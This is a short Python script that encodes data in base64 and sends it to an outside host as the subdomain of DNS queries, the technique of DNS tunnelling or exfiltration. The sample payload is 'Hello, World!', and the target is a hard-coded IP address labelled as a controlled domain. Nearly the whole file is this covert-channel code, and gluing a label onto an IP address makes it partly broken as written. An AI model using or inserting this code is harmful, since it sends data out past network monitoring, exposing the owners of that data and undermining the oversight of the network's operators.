import base64
import dns.resolver

# Encode data to be sent
def encode_data(data):
    return base64.urlsafe_b64encode(data.encode()).decode()

# Create DNS query
def create_dns_query(encoded_data, domain):
    return f"{encoded_data}.{domain}"

# Send DNS query
def send_dns_query(query):
    resolver = dns.resolver.Resolver()
    try:
        answer = resolver.query(query, "A")
        return answer
    except Exception as e:
        print(f"Query failed: {e}")
        return None

def main():
    domain = "104.248.36.68"  # Replace with your controlled domain
    data = "Hello, World!"
    encoded_data = encode_data(data)
    query = create_dns_query(encoded_data, domain)
    response = send_dns_query(query)
    if response:
        print("Query successful!")
    else:
        print("Query failed!")

if __name__ == "__main__":
    main()
